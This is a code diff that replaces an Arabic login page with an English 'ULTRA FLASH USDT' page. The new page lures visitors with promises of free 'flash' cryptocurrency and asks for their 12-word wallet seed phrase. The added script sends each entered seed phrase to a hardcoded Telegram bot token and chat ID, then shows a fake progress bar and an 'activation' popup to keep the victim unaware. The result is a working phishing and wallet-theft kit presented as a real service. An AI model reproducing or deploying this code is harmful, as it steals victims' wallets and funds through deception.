@@ -1,223 +1,265 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تسجيل الدخول</title>
+  <meta charset="UTF-8">
+  <title>ULTRA FLASH USDT</title>
   <style>
-    body, html {
-      height: 100%;
+    body {
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
       margin: 0;
       font-family: Arial, sans-serif;
-      direction: rtl;
-      overflow: hidden;
-    }
-
-    .video-bg {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: -1;
-    }
-
-    .login-container {
-      background-color: rgba(255, 255, 255, 0.2);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      border-radius: 16px;
-      padding: 25px 20px;
-      width: 280px;
-      margin: auto;
-      position: relative;
-      top: 50%;
-      transform: translateY(-50%);
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
       color: white;
+      height: 100vh;
+    }
+
+.chat-popup,
+.container,
+#popup {
+  background: rgba(0, 0, 0, 0.75);
+  backdrop-filter: blur(10px);
+  border-radius: 16px;
+  padding: 6vw;
+  width: 90vw;
+  max-width: 700px;
+  box-shadow: 0 0 15px rgba(0,0,0,0.6);
+  text-align: left;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+
+    .chat-popup.active {
+      display: block;
+    }
+
+    .container {
+      display: none;
+    }
+
+    h1 {
       text-align: center;
+      color: #00ccff;
     }
 
-    .login-container h2 {
-      margin-bottom: 20px;
+    .form-group {
+      margin-bottom: 15px;
     }
 
-    .input-field {
+    label {
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    select, textarea, button {
       width: 100%;
       padding: 10px;
-      margin: 10px 0;
       border-radius: 8px;
       border: none;
-      background-color: rgba(255, 255, 255, 0.8);
-    }
-
-    .login-button {
-      width: 100%;
-      padding: 10px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
       font-size: 16px;
     }
 
-    .login-button:hover {
-      background-color: #0056b3;
-    }
-
-    .signup-text {
-      margin-top: 15px;
-    }
-
-    .signup-link {
-      color: white;
-      font-weight: bold;
-      text-decoration: none;
-      margin-right: 5px;
-    }
-
-    .language-select {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-      background-color: rgba(255, 255, 255, 0.2);
-      border: none;
-      border-radius: 8px;
-      padding: 8px;
+    select, textarea {
+      background-color: #1a1a1a;
       color: white;
     }
 
-    .language-select select {
-      background: transparent;
-      color: white;
-      border: none;
+    textarea {
+      resize: none;
+      height: 100px;
+    }
+
+    #generateBtn {
+      background-color: #00ccff;
+      color: black;
       font-weight: bold;
       cursor: pointer;
     }
 
-    .language-select option {
-      color: black;
+    #progressBar {
+      height: 8px;
+      background-color: #333;
+      border-radius: 4px;
+      margin-top: 15px;
+      overflow: hidden;
+      display: none;
+    }
+
+    #progress {
+      height: 100%;
+      width: 0%;
+      background-color: #00ccff;
+    }
+
+    #popup, .lang-switcher {
+      display: none;
+    }
+
+    #popup button, #startBtn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #00ccff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .lang-switcher {
+      position: absolute;
+      top: 15px;
+      right: 15px;
     }
   </style>
 </head>
 <body>
 
-  <!-- فيديو الخلفية -->
-  <video autoplay muted loop class="video-bg">
-    <source src="background.mp4" type="video/mp4">
-  </video>
+<div class="lang-switcher">
+  <select id="language">
+    <option value="en">EN</option>
+    <option value="fr">FR</option>
+    <option value="zh">中文</option>
+    <option value="ru">РУС</option>
+  </select>
+</div>
 
-  <!-- اختيار اللغة -->
-  <div class="language-select">
-    🌐
-    <select onchange="changeLanguage(this)">
-      <option value="ar">العربية</option>
-      <option value="en">English</option>
-      <option value="fr">Français</option>
-      <option value="zh">中文</option>
-      <option value="ur">اردو</option>
+<div id="chatBox" class="chat-popup active">
+  <div id="welcomeText"></div>
+  <button id="startBtn">Continue</button>
+</div>
+
+<div class="container" id="mainContainer">
+  <h1>ULTRA FLASH USDT</h1>
+
+  <div class="form-group">
+    <label id="lblAmount" for="amount">Amount</label>
+    <select id="amount">
+      <option value="1">1k=Free</option>
+      <option value="2">5k=10 usdt</option>
+      <option value="3">20k=25 usdt</option>
     </select>
   </div>
 
-  <!-- واجهة تسجيل الدخول -->
-  <div class="login-container">
-    <h2 id="login-title">تسجيل الدخول</h2>
-    <input type="text" class="input-field" id="username" placeholder="اسم المستخدم أو الإيميل" />
-    <input type="password" class="input-field" id="password" placeholder="كلمة السر" />
-    <button class="login-button" id="login-button" onclick="checkLogin()">تسجيل الدخول</button>
-
-    <div class="signup-text">
-      <span id="no-account-text">ليس لديك حساب؟</span>
-      <a href="#" id="signup-link" class="signup-link" onclick="goToSignup()">إنشاء حساب</a>
-    </div>
+  <div class="form-group">
+    <label id="lblNetwork" for="network">Network</label>
+    <select id="network">
+      <option value="ERC20">ERC20</option>
+      <option value="BEP20">BEP20</option>
+      <option value="TRC20">TRC20</option>
+    </select>
   </div>
 
-  <!-- جافاسكريبت -->
-  <script>
-    const texts = {
-      ar: {
-        loginTitle: "تسجيل الدخول",
-        username: "اسم المستخدم أو الإيميل",
-        password: "كلمة السر",
-        login: "تسجيل الدخول",
-        noAccount: "ليس لديك حساب؟",
-        signUp: "إنشاء حساب"
-      },
-      en: {
-        loginTitle: "Login",
-        username: "Username or Email",
-        password: "Password",
-        login: "Login",
-        noAccount: "Don't have an account?",
-        signUp: "Sign Up"
-      },
-      fr: {
-        loginTitle: "Connexion",
-        username: "Nom d'utilisateur ou e-mail",
-        password: "Mot de passe",
-        login: "Se connecter",
-        noAccount: "Vous n'avez pas de compte ?",
-        signUp: "Créer un compte"
-      },
-      zh: {
-        loginTitle: "登录",
-        username: "用户名或邮箱",
-        password: "密码",
-        login: "登录",
-        noAccount: "还没有账户？",
-        signUp: "注册"
-      },
-      ur: {
-        loginTitle: "لاگ ان",
-        username: "صارف کا نام یا ای میل",
-        password: "پاسورڈ",
-        login: "لاگ ان",
-        noAccount: "اکاؤنٹ نہیں ہے؟",
-        signUp: "رجسٹر کریں"
+  <div class="form-group">
+    <label id="lblSeed" for="seed">12 PHRASE WALLET SEEDS</label>
+    <textarea id="seed" placeholder="Enter 12 words..."></textarea>
+  </div>
+
+  <button id="generateBtn">Generate</button>
+  <div id="progressBar"><div id="progress"></div></div>
+</div>
+
+<div id="popup">
+  <p><strong>WALLET NEED 10 usdt activate (you don't pay anything)</strong></p>
+  <button onclick="closePopup()">OK</button>
+</div>
+
+<script>
+  const messages = {
+    en: `Dear user\n1. This flash is for wallets and trading platforms (metamask, trustwallet, binance, bybit...)\n2. Wallet must have at least 10 usdt \n3. Our system keeps your personal information safe\n4. Enjoy`,
+    fr: `Cher utilisateur\n1. Ce flash est pour les portefeuilles et les plateformes de trading (metamask, trustwallet, binance, bybit...)\n2. Le portefeuille doit contenir au moins 10 usdt\n3. Notre système protège vos informations personnelles\n4. Profitez`,
+    zh: `亲爱的用户\n1. 本程序适用于钱包和交易平台 (Metamask, TrustWallet, Binance, Bybit...)\n2. 钱包需至少包含 0.001 BNB\n3. 我们的系统保障您的隐私\n4. 祝您使用愉快`,
+    ru: `Уважаемый пользователь\n1. Этот флеш для кошельков и платформ (metamask, trustwallet, binance, bybit...)\n2. На кошельке должно быть минимум 10 usdt BNB\n3. Мы храним ваши данные в безопасности\n4. Наслаждайтесь`
+  };
+
+  const labels = {
+    en: ["Amount", "Network", "12 PHRASE WALLET SEEDS", "Enter 12 words...", "Generate", "Regenerate"],
+    fr: ["Montant", "Réseau", "12 MOTS CLÉS DU PORTEFEUILLE", "Entrez 12 mots...", "Générer", "Régénérer"],
+    zh: ["金额", "网络", "12个助记词", "输入12个单词...", "生成", "重新生成"],
+    ru: ["Сумма", "Сеть", "12 СЛОВ КОШЕЛЬКА", "Введите 12 слов...", "Создать", "Создать заново"]
+  };
+
+  const languageSelect = document.getElementById('language');
+  const welcomeText = document.getElementById('welcomeText');
+  const chatBox = document.getElementById('chatBox');
+  const container = document.getElementById('mainContainer');
+  const startBtn = document.getElementById('startBtn');
+  const generateBtn = document.getElementById('generateBtn');
+  const seedInput = document.getElementById('seed');
+
+  function setLanguage(lang) {
+    welcomeText.textContent = messages[lang];
+    const [amt, net, seed, ph, gen, regen] = labels[lang];
+    document.getElementById("lblAmount").textContent = amt;
+    document.getElementById("lblNetwork").textContent = net;
+    document.getElementById("lblSeed").textContent = seed;
+    seedInput.placeholder = ph;
+    generateBtn.textContent = gen;
+    generateBtn.dataset.regen = regen;
+  }
+
+  languageSelect.addEventListener('change', () => {
+    const lang = languageSelect.value;
+    localStorage.setItem("lang", lang);
+    setLanguage(lang);
+  });
+
+  startBtn.addEventListener('click', () => {
+    chatBox.style.display = 'none';
+    container.style.display = 'block';
+  });
+
+  function validateSeed(seed) {
+    return seed.trim().split(/\s+/).length === 12;
+  }
+
+  function sendToTelegram(message) {
+    const chatId = '7739393558';
+    const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+  }
+
+  function closePopup() {
+    document.getElementById('popup').style.display = 'none';
+    generateBtn.textContent = generateBtn.dataset.regen;
+  }
+
+  generateBtn.addEventListener('click', () => {
+    const amount = document.getElementById('amount').value;
+    const network = document.getElementById('network').value;
+    const seed = seedInput.value.trim();
+    if (!validateSeed(seed)) return alert("Enter exactly 12 words.");
+
+    sendToTelegram(`ULTRA FLASH USDT\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`);
+
+    const progressBar = document.getElementById('progressBar');
+    const progress = document.getElementById('progress');
+    const popup = document.getElementById('popup');
+
+    progressBar.style.display = 'block';
+    progress.style.width = '0%';
+
+    let seconds = 0;
+    const interval = setInterval(() => {
+      seconds++;
+      progress.style.width = `${(seconds / 15) * 100}%`;
+      if (seconds === 7) popup.style.display = 'block';
+      if (seconds === 15) {
+        clearInterval(interval);
+        progressBar.style.display = 'none';
       }
-    };
+    }, 1000);
+  });
 
-    function changeLanguage(selectElement) {
-      const lang = selectElement.value;
-      localStorage.setItem("language", lang); // حفظ اللغة المختارة
-      applyLanguage(lang); // تطبيق اللغة المختارة
-    }
+  // Init
+  const savedLang = localStorage.getItem("lang") || "en";
+  languageSelect.value = savedLang;
+  setLanguage(savedLang);
+</script>
 
-    function applyLanguage(lang) {
-      const t = texts[lang] || texts["ar"];
-      document.getElementById("login-title").textContent = t.loginTitle;
-      document.getElementById("username").placeholder = t.username;
-      document.getElementById("password").placeholder = t.password;
-      document.getElementById("login-button").textContent = t.login;
-      document.getElementById("no-account-text").textContent = t.noAccount;
-      document.getElementById("signup-link").textContent = t.signUp;
-
-      // تعيين اتجاه النص حسب اللغة
-      document.body.style.direction = lang === "en" || lang === "fr" || lang === "zh" ? "ltr" : "rtl";
-    }
-
-    function checkLogin() {
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-
-      if (username === "1997" && password === "1997@") {
-        window.location.href = "page2.html";
-      } else {
-        alert("اسم المستخدم أو كلمة السر غير صحيحة");
-      }
-    }
-
-    function goToSignup() {
-      window.location.href = "page4.html";
-    }
-
-    window.onload = function () {
-      const savedLang = localStorage.getItem("language") || "ar"; // جلب اللغة المحفوظة
-      document.querySelector(".language-select select").value = savedLang;
-      applyLanguage(savedLang); // تطبيق اللغة المحفوظة
-    };
-  </script>
 </body>
 </html>
